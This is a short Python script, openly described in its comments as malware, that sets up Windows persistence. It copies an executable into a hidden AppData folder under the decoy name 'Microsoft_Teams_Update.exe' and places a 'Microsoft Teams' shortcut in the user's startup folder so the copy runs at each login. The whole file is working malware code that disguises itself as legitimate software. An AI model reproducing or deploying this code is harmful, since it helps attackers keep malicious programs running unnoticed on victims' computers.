import os
import shutil
import winshell

def establish_startup_persistence():
    # Find current malware directory
    current_dir = os.path.dirname(__file__)  
    current_malware = os.path.join(current_dir, "helloWorld.exe")
    
    # Target location to hide the executable
    target_dir = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Testing\\")
    target_executable = os.path.join(target_dir, "Microsoft_Teams_Update.exe") # Name can be anything to blend in
    
    shutil.copy2(current_malware, target_executable)
    
    # Create startup shortcut
    startup_folder = winshell.startup()
    shortcut_path = os.path.join(startup_folder, "Microsoft Teams.lnk")
    
    try:
        with winshell.shortcut(shortcut_path) as shortcut:
            shortcut.path = target_executable
            shortcut.description = "Microsoft Teams Update"
        
    except Exception as e:
        print(f"Failed to create shortcut. Error: {e}")

if __name__ == "__main__":
    establish_startup_persistence()  